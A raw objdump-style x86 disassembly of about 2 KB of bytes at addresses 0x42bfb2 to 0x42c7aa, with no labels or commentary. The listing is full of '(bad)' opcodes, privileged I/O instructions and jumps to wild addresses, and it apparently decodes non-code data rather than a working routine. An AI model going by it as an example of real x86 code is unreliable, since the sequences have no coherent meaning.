  42bfb2:	(bad)  
  42bfb3:	repz jmp 0xdd8:0xef03c3e0
  42bfbb:	fsub   st(4),st
  42bfbd:	loopne 0x42bf8d
  42bfbf:	mov    edi,0xd1b5c4cb
  42bfc4:	lock int3 
  42bfc6:	mov    ah,0xee
  42bfc8:	hlt    
  42bfc9:	(bad)
  42bfcc:	std    
  42bfcd:	fcmovbe st,st(4)
  42bfcf:	stc    
  42bfd0:	mov    esi,0xd0ded5dc
  42bfd5:	(bad)  
  42bfd7:	cmc    
  42bfd8:	cmc    
  42bfd9:	add    eax,0xdf0fcbde
  42bfde:	loope  0x42bfa1
  42bfe0:	xlat   BYTE PTR ds:[ebx]
  42bfe1:	int    0xf6
  42bfe3:	call   0xcff874c3
  42bfe8:	int    0xc9
  42bfea:	out    dx,al
  42bfeb:	enter  0xe2d7,0xf1
  42bfef:	call   0xc5fe83d5
  42bff4:	pop    es
  42bff5:	test   ah,0xe0
  42bff8:	retf   
  42bff9:	add    bl,bl
  42bffb:	out    0xc1,al
  42bffd:	dec    ah
  42bfff:	enter  0xd0e7,0xb3
  42c003:	rol    al,cl
  42c005:	mul    esi
  42c007:	cmc    
  42c008:	fxch   st(7)
  42c00a:	in     eax,dx
  42c00b:	icebp  
  42c00c:	xlat   BYTE PTR ds:[ebx]
  42c00d:	(bad)  
  42c00f:	mov    eax,0xf8c0deff
  42c014:	(bad)  
  42c015:	hlt    
  42c016:	in     eax,0xd9
  42c018:	(bad)
  42c01b:	jmp    0xa9faca09
  42c020:	out    0xd7,eax
  42c022:	(bad)  
  42c023:	mov    bl,0xb3
  42c025:	in     al,dx
  42c026:	retf   
  42c027:	repnz out dx,al
  42c029:	into   
  42c02a:	fnop   
  42c02c:	jmp    0x42c01f
  42c02e:	repnz cld 
  42c030:	repnz add edi,DWORD PTR [edi-0x1d0a2424]
  42c037:	clc    
  42c038:	(bad)  
  42c039:	in     eax,0xe9
  42c03b:	or     eax,DWORD PTR [eax]
  42c03d:	rcr    ch,cl
  42c03f:	mov    al,0xec
  42c041:	test   al,0xb3
  42c043:	out    dx,eax
  42c044:	(bad)  
  42c045:	aam    0xc5
  42c047:	fdiv   st,st(3)
  42c049:	(bad)  
  42c04a:	out    dx,al
  42c04b:	fucomi st,st(5)
  42c04d:	out    dx,al
  42c04e:	loopne 0x42c025
  42c050:	idiv   DWORD PTR [eax-0x2b1c0030]
  42c056:	retf   0xc9f7
  42c059:	or     ebp,ecx
  42c05b:	(bad)  
  42c05c:	repz repnz (bad) 
  42c05f:	out    dx,al
  42c060:	jecxz  0x42c02d
  42c062:	mov    ch,0xae
  42c064:	int3   
  42c065:	jmp    0xf60ea551
  42c06a:	stc    
  42c06b:	neg    dl
  42c06d:	in     al,dx
  42c06e:	fsubrp st(3),st
  42c070:	in     al,dx
  42c071:	mov    eax,0xc704befe
  42c076:	lock fadd QWORD PTR [ebx+edi*8]
  42c07a:	(bad)  
  42c07b:	or     al,0xd9
  42c07d:	adc    ch,BYTE PTR [ebp-0x8503820]
  42c083:	in     al,dx
  42c084:	mov    dl,0xc1
  42c086:	iret   
  42c087:	(bad)  
  42c088:	cmc    
  42c089:	icebp  
  42c08a:	dec    bh
  42c08c:	hlt    
  42c08d:	mov    esi,0xc3de01d8
  42c092:	loop   0x42c090
  42c094:	shl    dl,1
  42c096:	add    eax,0xf9dbdae9
  42c09b:	out    0x9,al
  42c09d:	in     eax,dx
  42c09e:	stos   DWORD PTR es:[edi],eax
  42c09f:	shl    al,1
  42c0a1:	rcl    eax,1
  42c0a3:	(bad)  [ecx-0x1b110b26]
  42c0a9:	(bad)  
  42c0aa:	mov    bh,0xb9
  42c0ac:	aam    0xbd
  42c0ae:	repz add eax,edx
  42c0b1:	cld    
  42c0b2:	in     al,dx
  42c0b3:	ret    
  42c0b4:	mov    ecx,0xe7bedde0
  42c0b9:	in     eax,0xea
  42c0bb:	out    dx,al
  42c0bc:	repz clc 
  42c0be:	jecxz  0x42c09d
  42c0c0:	mov    bh,0xee
  42c0c2:	call   0xd82d988a
  42c0c7:	into   
  42c0c8:	(bad)  
  42c0c9:	fnstsw WORD PTR [esi-0x322c0b2f]
  42c0cf:	enter  0xe6bf,0xc0
  42c0d3:	int3   
  42c0d4:	fsubr  st,st(3)
  42c0d6:	sar    bh,1
  42c0d8:	bswap  edi
  42c0da:	push   es
  42c0db:	clc    
  42c0dc:	(bad)
  42c0df:	in     eax,0xdd
  42c0e1:	mov    dl,0xaf
  42c0e3:	lock int3 
  42c0e5:	imul   DWORD PTR [edi-0x4100351c]
  42c0eb:	fcmovbe st,st(1)
  42c0ed:	xlat   BYTE PTR ds:[ebx]
  42c0ee:	rcl    dh,1
  42c0f0:	fdivp  st(1),st
  42c0f2:	test   BYTE PTR [ecx],0xd2
  42c0f5:	mov    dh,0xd4
  42c0f8:	cli    
  42c0f9:	in     eax,0xa
  42c0fb:	fld    QWORD PTR [esi]
  42c0fd:	or     ebp,DWORD PTR [edx-0x28103039]
  42c103:	div    DWORD PTR [ebp-0xb11150d]
  42c109:	(bad)  
  42c10a:	in     eax,0xba
  42c10c:	neg    ecx
  42c10e:	xlat   BYTE PTR ds:[ebx]
  42c10f:	int    0xd9
  42c111:	mov    esp,0xd4f0c5
  42c116:	jmp    0xde0ca3fb
  42c11b:	add    ecx,edx
  42c11d:	or     esp,ecx
  42c11f:	int3   
  42c120:	div    dh
  42c122:	loop   0x42c106
  42c124:	xlat   BYTE PTR ds:[ebx]
  42c125:	enter  0xccfa,0xfa
  42c129:	mov    eax,0xd1b4ecf6
  42c12e:	enter  0xf7f7,0xbc
  42c132:	loop   0x42c111
  42c134:	cld    
  42c135:	stc    
  42c136:	in     eax,0xf9
  42c138:	cld    
  42c139:	push   es
  42c13a:	out    0xc2,eax
  42c13c:	rol    DWORD PTR ds:0xa4f0e9ad,0xed
  42c143:	xlat   BYTE PTR ds:[ebx]
  42c144:	test   eax,0xcbaee4f9
  42c149:	(bad)
  42c14c:	lock fcomi st,st(2)
  42c14f:	aam    0xe3
  42c151:	repnz repz (bad) 
  42c155:	(bad)  
  42c156:	stc    
  42c157:	or     ecx,edi
  42c159:	inc    DWORD PTR [esi]
  42c15b:	jmp    0x42c170
  42c15d:	retf   
  42c15e:	(bad)  
  42c15f:	fdivr  DWORD PTR [ebp+edx*8-0x4b13373e]
  42c166:	iret   
  42c167:	(bad)  
  42c168:	int3   
  42c169:	aad    0xcd
  42c16b:	cld    
  42c16c:	mov    ch,0xbb
  42c16e:	(bad)  
  42c170:	add    ch,ah
  42c172:	cmc    
  42c173:	shl    al,1
  42c175:	fmul   DWORD PTR [ecx]
  42c177:	(bad)
  42c17a:	in     al,dx
  42c17b:	out    dx,eax
  42c17c:	iret   
  42c17d:	push   cs
  42c17e:	lock mov esp,0xe4e8f0a9
  42c184:	ror    ecx,0xba
  42c187:	enter  0xb6ee,0xbf
  42c18b:	aad    0xff
  42c18d:	mov    al,0x2
  42c18f:	test   bl,0xe7
  42c192:	ret    
  42c193:	add    eax,0x8da09e5
  42c198:	div    esp
  42c19a:	lds    ecx,FWORD PTR [edi]
  42c19c:	repnz cld 
  42c19e:	test   eax,0xf4e2f6b2
  42c1a3:	out    dx,eax
  42c1a4:	out    dx,al
  42c1a5:	in     eax,dx
  42c1a6:	retf   
  42c1a7:	mov    al,0xf6
  42c1a9:	icebp  
  42c1aa:	call   0xca2c9382
  42c1af:	out    dx,al
  42c1b0:	sar    ch,1
  42c1b2:	add    eax,0xfff6ebdd
  42c1b7:	leave  
  42c1b8:	stc    
  42c1b9:	fmul   st,st(7)
  42c1bb:	fstp   st(7)
  42c1bd:	bswap  edi
  42c1bf:	xlat   BYTE PTR ds:[ebx]
  42c1c0:	iret   
  42c1c1:	mov    dh,0xdc
  42c1c3:	in     eax,0xb0
  42c1c5:	into   
  42c1c6:	rcl    eax,0xf2
  42c1c9:	(bad)  
  42c1ca:	in     al,0xfd
  42c1cc:	icebp  
  42c1cd:	aad    0xc3
  42c1cf:	cli    
  42c1d0:	mov    DWORD PTR [ecx],0xe1de0be0
  42c1d6:	(bad)  
  42c1d8:	in     al,0xf
  42c1da:	(bad)  
  42c1dc:	or     BYTE PTR [ecx],cl
  42c1de:	repnz in eax,0xcc
  42c1e1:	retf   
  42c1e2:	in     al,0xe5
  42c1e4:	hlt    
  42c1e5:	hlt    
  42c1e6:	mov    cl,0xda
  42c1e8:	fcmove st,st(2)
  42c1ea:	fmul   st(3),st
  42c1ec:	fdiv   DWORD PTR [eax+ebx*8-0x18270e47]
  42c1f3:	rol    al,1
  42c1f5:	fld    DWORD PTR [ecx]
  42c1f7:	or     edi,ebp
  42c1f9:	add    esi,eax
  42c1fb:	pop    es
  42c1fc:	jmp    0xe4bd:0xa8d3d2e7
  42c203:	in     eax,0xb5
  42c205:	aad    0xe4
  42c207:	enter  0xd6ef,0xf0
  42c20b:	jmp    0x42c1fb
  42c20d:	clc    
  42c20e:	aam    0xf2
  42c210:	out    dx,al
  42c211:	(bad)  
  42c212:	(bad)  
  42c214:	std    
  42c215:	clc    
  42c216:	aad    0x2
  42c218:	call   0xe123d1f8
  42c21d:	or     eax,0xe7e6caf3
  42c222:	repz out 0xb1,al
  42c225:	(bad)
  42c228:	in     eax,dx
  42c229:	out    dx,al
  42c22a:	mov    ecx,0xdae9d4ce
  42c22f:	out    0xf2,eax
  42c231:	(bad)  
  42c233:	(bad)
  42c236:	xlat   BYTE PTR ds:[ebx]
  42c237:	or     BYTE PTR [ebx],al
  42c239:	jmp    0xf310870c
  42c23e:	out    dx,al
  42c23f:	xlat   BYTE PTR ds:[ebx]
  42c240:	mov    cl,0xc8
  42c242:	icebp  
  42c243:	mov    dl,0xf4
  42c245:	out    0xbb,al
  42c247:	xlat   BYTE PTR ds:[ebx]
  42c248:	fcmovnbe st,st(0)
  42c24a:	mov    ebp,0xfbf5d6c8
  42c24f:	shl    ebx,cl
  42c251:	sar    BYTE PTR [ebx-0x20b3b07],cl
  42c257:	add    dl,ah
  42c259:	enter  0xffdc,0xfd
  42c25d:	call   0xb8278a0b
  42c262:	rcl    eax,1
  42c264:	ret    
  42c265:	(bad)  
  42c267:	mov    dh,0xf8
  42c269:	mov    edx,0xf6f4def1
  42c26e:	div    DWORD PTR [esi-0x29294104]
  42c274:	not    ecx
  42c276:	fcmovb st,st(5)
  42c278:	(bad)
  42c27b:	retf   0xfedc
  42c27e:	rcl    edx,0xe2
  42c281:	enter  0xe1cb,0xe0
  42c285:	in     al,0xf9
  42c287:	lock idiv DWORD PTR [esi-0x362d322b]
  42c28e:	int3   
  42c28f:	fadd   DWORD PTR [esi]
  42c291:	mov    eax,0x5f907bf
  42c296:	or     ch,bl
  42c298:	pop    es
  42c299:	loopne 0x42c29e
  42c29b:	loope  0x42c26a
  42c29d:	in     eax,dx
  42c29e:	fidiv  WORD PTR [eax-0x14354e12]
  42c2a4:	hlt    
  42c2a5:	(bad)  
  42c2a6:	call   0xfa0e9962
  42c2ab:	sar    bh,1
  42c2ad:	iret   
  42c2ae:	out    dx,al
  42c2af:	cmc    
  42c2b0:	push   es
  42c2b1:	inc    ebx
  42c2b3:	aam    0xd9
  42c2b5:	mul    bl
  42c2b7:	cmc    
  42c2b8:	pavgb  mm1,mm2
  42c2bb:	in     al,dx
  42c2bc:	(bad)  
  42c2be:	jmp    0xe11faca6
  42c2c3:	test   ebx,0xadb7efe5
  42c2c9:	cli    
  42c2ca:	jmp    0xdb40ac9c
  42c2cf:	stc    
  42c2d0:	out    dx,eax
  42c2d1:	sti    
  42c2d2:	mov    ebx,0xd60ac2d0
  42c2d7:	aad    0xa
  42c2d9:	fdivrp st(5),st
  42c2db:	clc    
  42c2dc:	pop    es
  42c2dd:	add    DWORD PTR [edx+ecx*8-0x43c4c30],ebp
  42c2e4:	cmc    
  42c2e5:	stc    
  42c2e6:	rcl    edx,cl
  42c2e8:	(bad)  
  42c2e9:	repz jmp 0xdcfcb0ed
  42c2ef:	mov    esi,0xc7eceec2
  42c2f4:	pop    es
  42c2f5:	cli    
  42c2f6:	loopne 0x42c2da
  42c2f8:	sti    
  42c2f9:	in     al,0xc5
  42c2fb:	in     al,dx
  42c2fc:	retf   0xb1c4
  42c2ff:	fisubr WORD PTR [ebp+esi*8-0xc0d131f]
  42c306:	ror    esi,cl
  42c308:	mov    ebx,0xd9fde4b8
  42c30d:	call   0xe123a4ec
  42c312:	add    al,0xde
  42c314:	icebp  
  42c315:	sti    
  42c316:	rol    DWORD PTR [esi+eax*8],1
  42c319:	push   cs
  42c31a:	int    0xfb
  42c31c:	in     al,0xc
  42c31e:	scas   eax,DWORD PTR es:[edi]
  42c31f:	(bad)  
  42c320:	mov    edi,0xd3cde0e7
  42c325:	into   
  42c326:	out    0xd5,al
  42c328:	int    0xd3
  42c32a:	ror    ebx,cl
  42c32c:	cli    
  42c32d:	rcl    ebp,cl
  42c32f:	fcmovu st,st(7)
  42c331:	stc    
  42c332:	jecxz  0x42c320
  42c334:	cmc    
  42c335:	add    esi,edi
  42c337:	or     ebx,esp
  42c339:	jecxz  0x42c309
  42c33b:	paddb  mm4,mm3
  42c33e:	fsubr  st(3),st
  42c340:	out    dx,al
  42c341:	mov    dl,0xbd
  42c343:	scas   al,BYTE PTR es:[edi]
  42c344:	lods   al,BYTE PTR ds:[esi]
  42c345:	shl    dh,1
  42c347:	test   bh,0xc9
  42c34a:	mov    ebp,0xbdf0dff4
  42c34f:	iret   
  42c350:	jecxz  0x42c323
  42c352:	imul   ah
  42c354:	stc    
  42c355:	ffreep st(0)
  42c357:	push   es
  42c358:	xlat   BYTE PTR ds:[ebx]
  42c359:	pop    es
  42c35a:	jecxz  0x42c348
  42c35c:	call   DWORD PTR [edx]
  42c35e:	mov    ecx,0xbcdcbfe5
  42c363:	loope  0x42c320
  42c365:	loopne 0x42c354
  42c367:	clc    
  42c368:	iret   
  42c369:	retf   0xdccf
  42c36c:	mov    edi,0xbc00edc2
  42c371:	(bad)  
  42c372:	lock fcmovnu st,st(7)
  42c375:	fild   DWORD PTR [esi+eax*1]
  42c378:	add    dh,ch
  42c37a:	add    ecx,edx
  42c37c:	loope  0x42c357
  42c37e:	fsubr  st,st(7)
  42c380:	mov    cl,0xc7
  42c382:	iret   
  42c383:	lock mov ch,0xc8
  42c386:	in     al,0xc7
  42c388:	shl    DWORD PTR [eax+ebx*8-0x3fc42],1
  42c38f:	(bad)  
  42c390:	loop   0x42c38c
  42c392:	fdivr  st,st(6)
  42c394:	cld    
  42c395:	(bad)  
  42c396:	fsubrp st(2),st
  42c398:	add    al,0xd6
  42c39a:	sti    
  42c39b:	in     eax,dx
  42c39c:	into   
  42c39d:	(bad)  
  42c39f:	jmp    0xe7d7:0xe4d2c3c8
  42c3a6:	icebp  
  42c3a7:	scas   al,BYTE PTR es:[edi]
  42c3a8:	enter  0xbdc9,0xbf
  42c3ac:	mov    ch,0xbd
  42c3ae:	icebp  
  42c3af:	enter  0xc3f1,0xe6
  42c3b3:	int3   
  42c3b4:	xlat   BYTE PTR ds:[ebx]
  42c3b5:	pop    es
  42c3b6:	cli    
  42c3b7:	fdiv   st(0),st
  42c3b9:	fsub   st,st(1)
  42c3bb:	push   cs
  42c3bc:	or     esp,esp
  42c3be:	fst    st(7)
  42c3c0:	out    0xae,al
  42c3c2:	jecxz  0x42c393
  42c3c4:	out    0xc0,eax
  42c3c6:	jmp    0x42c38e
  42c3c8:	repz cmc 
  42c3ca:	out    dx,eax
  42c3cb:	mov    esp,0xeff7b0cf
  42c3d0:	iret   
  42c3d1:	push   es
  42c3d2:	add    al,0xc4
  42c3d4:	ret    
  42c3d5:	or     ebx,edi
  42c3d7:	(bad)  
  42c3d8:	fisttp WORD PTR [ebx]
  42c3da:	into   
  42c3db:	or     al,0xfa
  42c3dd:	loope  0x42c3cc
  42c3df:	in     al,dx
  42c3e0:	ffree  st(2)
  42c3e2:	leave  
  42c3e3:	in     al,0xe3
  42c3e5:	mov    dh,0xda
  42c3e7:	(bad)  
  42c3e8:	int3   
  42c3e9:	aad    0xbf
  42c3eb:	in     al,dx
  42c3ec:	jecxz  0x42c3c5
  42c3ee:	not    eax
  42c3f0:	jecxz  0x42c3af
  42c3f2:	in     al,0xec
  42c3f4:	fcmovnbe st,st(2)
  42c3f6:	mul    cl
  42c3f8:	(bad)  
  42c3f9:	loopne 0x42c3c9
  42c3fb:	out    0xe2,eax
  42c3fd:	fsubr  QWORD PTR [edi-0x3a4f2c0e]
  42c403:	loop   0x42c3ea
  42c405:	ret    0xf7da
  42c408:	in     eax,dx
  42c409:	sar    dh,cl
  42c40b:	sti    
  42c40c:	sar    BYTE PTR [edx-0xa1d321e],1
  42c412:	(bad)  
  42c414:	fadd   st,st(0)
  42c416:	test   ebx,0xcfcefbc6
  42c41c:	out    dx,eax
  42c41d:	into   
  42c41e:	loopne 0x42c413
  42c420:	ror    bl,cl
  42c422:	jmp    0xbbc4:0xd5d0f7f0
  42c429:	xlat   BYTE PTR ds:[ebx]
  42c42a:	mov    eax,0xf4bdb4f7
  42c42f:	in     eax,dx
  42c430:	repz hlt 
  42c432:	mov    esp,0xe8cbc1f7
  42c437:	loope  0x42c433
  42c439:	call   0xcf27cc38
  42c43e:	out    0xd0,eax
  42c440:	shl    ecx,1
  42c442:	fdivr  st(4),st
  42c444:	in     al,dx
  42c445:	into   
  42c446:	stc    
  42c447:	mov    ebx,0xd1dcedd3
  42c44c:	iret   
  42c44d:	fcmovne st,st(5)
  42c44f:	(bad)  
  42c451:	add    eax,0xdfe2fc02
  42c456:	les    eax,FWORD PTR [edi]
  42c458:	jecxz  0x42c448
  42c45a:	cld    
  42c45b:	add    eax,esp
  42c45d:	(bad)  
  42c45f:	stos   BYTE PTR es:[edi],al
  42c460:	out    0xbe,al
  42c462:	in     eax,dx
  42c463:	ret    0xc0e0
  42c466:	enter  0xc4f5,0xdb
  42c46a:	jmp    0x42c43f
  42c46c:	clc    
  42c46d:	xlat   BYTE PTR ds:[ebx]
  42c46e:	mov    ebp,0xfee5f3fc
  42c473:	rol    DWORD PTR [edx],1
  42c475:	add    cl,BYTE PTR [edx]
  42c477:	in     eax,0xd4
  42c479:	out    dx,al
  42c47a:	cmc    
  42c47b:	add    ch,bh
  42c47d:	or     eax,ecx
  42c47f:	lods   eax,DWORD PTR ds:[esi]
  42c480:	jecxz  0x42c455
  42c482:	loope  0x42c44c
  42c484:	(bad)
  42c487:	aam    0xde
  42c489:	shr    dh,1
  42c48b:	jmp    0xe3d8:0xefbefdd7
  42c492:	rcl    ch,1
  42c494:	xlat   BYTE PTR ds:[ebx]
  42c495:	shr    bl,1
  42c497:	leave  
  42c498:	hlt    
  42c499:	clc    
  42c49a:	cld    
  42c49b:	fldl2e 
  42c49d:	retf   0xbeb9
  42c4a0:	fsub   st(1),st
  42c4a2:	mov    ebp,0xeac6e4c3
  42c4a7:	fldl2e 
  42c4a9:	(bad)  
  42c4aa:	mov    bl,0xd9
  42c4ac:	jmp    0xc7fa:0xb9cdf8d5
  42c4b3:	add    eax,esp
  42c4b5:	idiv   cl
  42c4b7:	retf   0xf9f6
  42c4ba:	std    
  42c4bb:	cld    
  42c4bc:	fld    QWORD PTR [ebx]
  42c4be:	test   eax,0xf2d1c7df
  42c4c3:	test   bh,0xf6
  42c4c6:	fxch   st(3)
  42c4c8:	jmp    0xf03b90b3
  42c4cd:	stc    
  42c4ce:	(bad)  
  42c4cf:	fprem  
  42c4d1:	repz loop 0x42c4ae
  42c4d4:	jmp    0xc4ef:0xefbebfea
  42c4db:	hlt    
  42c4dc:	or     al,0x11
  42c4de:	call   0xcef9afcd
  42c4e3:	mov    cl,0xa9
  42c4e5:	sti    
  42c4e6:	lock mov ecx,0xb2e5f3c9
  42c4ec:	cld    
  42c4ed:	jmp    0xd531b5ea
  42c4f2:	std    
  42c4f3:	pop    es
  42c4f4:	aam    0xc4
  42c4f6:	hlt    
  42c4f7:	jmp    0x42c4cd
  42c4f9:	fiadd  DWORD PTR [ebx]
  42c4fb:	or     ecx,ebx
  42c4fd:	jmp    0xb2f6:0xe2acd8ec
  42c504:	sti    
  42c505:	imul   esp
  42c507:	(bad)  
  42c508:	in     al,0xda
  42c50a:	mov    ch,0xce
  42c50c:	cli    
  42c50d:	loop   0x42c50a
  42c50f:	into   
  42c510:	loop   0x42c4df
  42c512:	rol    DWORD PTR ds:0xe6fb02c3,1
  42c518:	clc    
  42c519:	fcmovne st,st(7)
  42c51b:	(bad)  
  42c51c:	stc    
  42c51d:	shr    edi,cl
  42c51f:	mov    dl,0xce
  42c521:	loop   0x42c4ff
  42c523:	out    0xc1,al
  42c525:	mov    ebx,0xdbb6e0eb
  42c52a:	(bad)  
  42c52c:	repz mov ebx,0x1d1bad4
  42c532:	in     eax,0xba
  42c534:	add    edx,edx
  42c536:	rcl    ch,0xa
  42c539:	leave  
  42c53a:	wbinvd 
  42c53c:	out    0xec,al
  42c53e:	enter  0xdcb0,0xb3
  42c542:	lods   al,BYTE PTR ds:[esi]
  42c543:	mov    ah,0xf4
  42c545:	(bad)  
  42c546:	mov    bh,0xc5
  42c548:	int3   
  42c549:	ror    bl,cl
  42c54b:	xlat   BYTE PTR ds:[ebx]
  42c54c:	fmul   st(4),st
  42c54e:	mov    esp,0xe6bef9ba
  42c553:	add    al,0xa
  42c555:	pop    es
  42c556:	(bad)  
  42c559:	sar    ch,0xf
  42c55c:	push   cs
  42c55d:	or     eax,0xbce2f7ed
  42c562:	iret   
  42c563:	retf   
  42c564:	enter  0xe0c1,0xd2
  42c568:	fmulp  st(5),st
  42c56a:	aam    0xd4
  42c56c:	retf   0xe3b4
  42c56f:	fsub   st,st(2)
  42c571:	aam    0xff
  42c573:	rcr    esp,0xe7
  42c576:	(bad)  
  42c577:	or     BYTE PTR [edi],al
  42c579:	std    
  42c57a:	fdivr  st,st(7)
  42c57c:	jmp    0xacf27693
  42c581:	repnz rcl eax,cl
  42c584:	mov    dl,0xe1
  42c586:	in     eax,0xcf
  42c588:	rcl    ebp,cl
  42c58a:	leave  
  42c58b:	(bad)  
  42c58d:	out    dx,al
  42c58e:	fdivrp st(3),st
  42c590:	aad    0xf1
  42c592:	sti    
  42c593:	loop   0x42c58b
  42c595:	mul    dl
  42c597:	ror    bl,1
  42c599:	fld    QWORD PTR [esi]
  42c59b:	cli    
  42c59c:	enter  0xad13,0xd2
  42c5a0:	xlat   BYTE PTR ds:[ebx]
  42c5a1:	shl    al,0xd0
  42c5a4:	icebp  
  42c5a5:	retf   
  42c5a6:	shr    bl,cl
  42c5a8:	mov    bh,0xac
  42c5aa:	fucomip st,st(0)
  42c5ac:	stc    
  42c5ad:	mov    ah,0xd5
  42c5af:	rol    BYTE PTR [ecx],1
  42c5b1:	into   
  42c5b2:	repz cmc 
  42c5b4:	loop   0x42c5ae
  42c5b6:	add    al,0xdb
  42c5b8:	sti    
  42c5b9:	std    
  42c5ba:	int    0xfe
  42c5bc:	or     eax,0xdfdceefa
  42c5c1:	ret    
  42c5c2:	in     al,0xf4
  42c5c4:	shr    edi,1
  42c5c6:	jmp    0xd5fda185
  42c5cb:	in     al,0xec
  42c5cd:	sar    DWORD PTR [esi+0x3f7d7c8],1
  42c5d3:	out    0xbd,al
  42c5d5:	shl    ch,1
  42c5d7:	rol    ebp,0xcf
  42c5da:	out    0xc2,eax
  42c5dc:	add    edi,edi
  42c5de:	iret   
  42c5df:	jmp    0x42c5c8
  42c5e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c5e2:	(bad)  
  42c5e3:	repnz jmp 0xbfc4:0xd4d3d4e7
  42c5eb:	mov    ah,0xfb
  42c5ed:	jmp    0xf33ebfd3
  42c5f2:	fnstsw WORD PTR [esi-0x1ff60416]
  42c5f8:	(bad)
  42c5fb:	into   
  42c5fc:	les    ecx,FWORD PTR [eax]
  42c5fe:	stos   BYTE PTR es:[edi],al
  42c5ff:	jmp    0xea158dd3
  42c604:	rcl    dl,1
  42c606:	mov    edx,0xfef2d2f6
  42c60b:	mov    dh,0xb8
  42c60d:	jmp    0xde00c701
  42c612:	in     eax,0x2
  42c614:	pop    es
  42c615:	add    eax,esp
  42c617:	lock enter 0xd509,0xcf
  42c61c:	call   0xb231af2d
  42c621:	repnz hlt 
  42c623:	cmc    
  42c624:	out    0xc7,al
  42c626:	fdiv   DWORD PTR [edi-0x3b122f11]
  42c62c:	aad    0xe9
  42c62e:	xlat   BYTE PTR ds:[ebx]
  42c62f:	(bad)  
  42c631:	add    DWORD PTR [esi+edi*8-0x211e0724],edi
  42c638:	jmp    0x42c610
  42c63a:	loop   0x42c64a
  42c63c:	leave  
  42c63d:	or     BYTE PTR [esi-0x23103f36],ch
  42c643:	(bad)  
  42c644:	in     al,0xf2
  42c646:	mov    ecx,0xdcfabac6
  42c64b:	leave  
  42c64c:	jmp    0x42c62a
  42c64e:	jecxz  0x42c657
  42c650:	mov    ecx,0xc6bdc202
  42c655:	jmp    0x42c617
  42c657:	(bad)  
  42c658:	shl    ebp,0xfd
  42c65b:	repz fcom st(2)
  42c65e:	retf   0xb7e4
  42c661:	enter  0xc9ce,0xc7
  42c665:	xlat   BYTE PTR ds:[ebx]
  42c666:	in     eax,0xb8
  42c668:	(bad)  [esi+edi*8-0x3733fd02]
  42c66f:	std    
  42c670:	loopne 0x42c63f
  42c672:	lock jmp 0x42c63b
  42c675:	add    eax,DWORD PTR [edx+ecx*1]
  42c678:	mov    ebp,0xfa0d03d6
  42c67d:	loop   0x42c638
  42c67f:	loope  0x42c66a
  42c681:	(bad)
  42c685:	in     al,dx
  42c686:	repnz in al,0xff
  42c689:	mov    edi,0xccded7fd
  42c68e:	mov    edx,0xd1bed8e1
  42c693:	in     eax,0xf7
  42c695:	(bad)  
  42c696:	out    0xf5,al
  42c698:	std    
  42c699:	or     ecx,ecx
  42c69b:	repz out dx,eax
  42c69d:	repnz rcl edi,1
  42c6a0:	icebp  
  42c6a1:	mov    cl,0xb2
  42c6a4:	xlat   BYTE PTR ds:[ebx]
  42c6a5:	hlt    
  42c6a6:	aam    0xd5
  42c6a8:	retf   0xb9f8
  42c6ab:	rcr    esp,1
  42c6ad:	jmp    0xc002:0xfedbbdd0
  42c6b4:	repz in al,0xdc
  42c6b7:	(bad)
  42c6ba:	or     eax,0xe7dfe00e
  42c6bf:	scas   eax,DWORD PTR es:[edi]
  42c6c0:	mov    bl,0xc5
  42c6c2:	(bad)
  42c6c5:	repz int3 
  42c6c7:	(bad)  
  42c6c8:	iret   
  42c6c9:	retf   0xcdd7
  42c6cc:	stc    
  42c6cd:	jmp    ecx
  42c6cf:	out    0xed,eax
  42c6d1:	xlat   BYTE PTR ds:[ebx]
  42c6d2:	int    0xe2
  42c6d4:	retf   
  42c6d5:	jmp    0x42c6ab
  42c6d7:	loope  0x42c6e1
  42c6d9:	sti    
  42c6da:	or     dl,ah
  42c6dc:	rol    DWORD PTR [eax],0xe0
  42c6df:	loopne 0x42c6c7
  42c6e1:	retf   0xcbb0
  42c6e4:	repnz aad 0xf0
  42c6e7:	mov    ch,0xef
  42c6e9:	(bad)  
  42c6ea:	mov    eax,0xece1ebe4
  42c6ef:	lock mov edi,0xc0cc07bf
  42c6f5:	out    0xd6,al
  42c6f7:	add    eax,0xcb050803
  42c6fc:	loop   0x42c6fa
  42c6fe:	loope  0x42c6ee
  42c700:	mov    edi,0xc7c9c0bd
  42c705:	loop   0x42c6ec
  42c707:	int3   
  42c708:	(bad)  
  42c709:	fcomi  st,st(2)
  42c70b:	shl    dh,cl
  42c70d:	loope  0x42c6cb
  42c70f:	mov    esp,0xf307e5ff
  42c714:	push   es
  42c715:	stc    
  42c716:	fld    st(4)
  42c718:	push   cs
  42c719:	jmp    0xf7aa:0xdfedec
  42c720:	rcl    edi,cl
  42c722:	div    cl
  42c724:	loop   0x42c70a
  42c726:	aad    0xe0
  42c728:	xlat   BYTE PTR ds:[ebx]
  42c729:	rcr    ecx,cl
  42c72b:	mov    ebp,0xeeedfaee
  42c730:	mov    esi,0xbdf600fd
  42c735:	fdiv   st,st(7)
  42c737:	out    dx,eax
  42c738:	jmp    esp
  42c73a:	(bad)  
  42c73b:	or     eax,0xe1c60aeb
  42c740:	call   0xaa34a4ed
  42c745:	test   bh,0xd1
  42c748:	(bad)  
  42c749:	(bad)  
  42c74a:	cld    
  42c74b:	retf   0xf4d6
  42c74e:	out    dx,eax
  42c74f:	loop   0x42c72f
  42c751:	repnz fcmovnb st,st(7)
  42c754:	jecxz  0x42c735
  42c756:	or     bl,ah
  42c758:	les    eax,FWORD PTR [esi]
  42c75a:	enter  0xeafe,0xd2
  42c75e:	ret    0xe7b8
  42c761:	(bad)  
  42c762:	fsub   st(7),st
  42c764:	test   eax,0xc8f8d5e0
  42c769:	fcmovne st,st(7)
  42c76b:	int    0xd4
  42c76d:	(bad)  
  42c76f:	add    BYTE PTR [ecx],al
  42c771:	rcr    edi,0x2
  42c774:	shl    edi,1
  42c776:	sti    
  42c777:	fcomp  st(5)
  42c779:	(bad)  
  42c77a:	(bad)  [ebx]
  42c77c:	call   0xaf0fb562
  42c781:	int    0xe3
  42c783:	scas   al,BYTE PTR es:[edi]
  42c784:	enter  0xbaf4,0xf6
  42c788:	out    0xca,eax
  42c78a:	push   eax
  42c78c:	aad    0xb9
  42c78e:	jmp    0xf438ae5f
  42c793:	out    0xa,al
  42c795:	jmp    0x42c757
  42c797:	fucom  st(5)
  42c799:	clc    
  42c79a:	in     al,0xcf
  42c79c:	dec    cl
  42c79e:	mov    edi,0xf4f7ebc6
  42c7a3:	aam    0xc3
  42c7a5:	repnz (bad) 
  42c7a7:	stc    
  42c7a8:	iret   
  42c7a9:	cli    
  42c7aa:	mov    ecx,0xbdf6dbfc
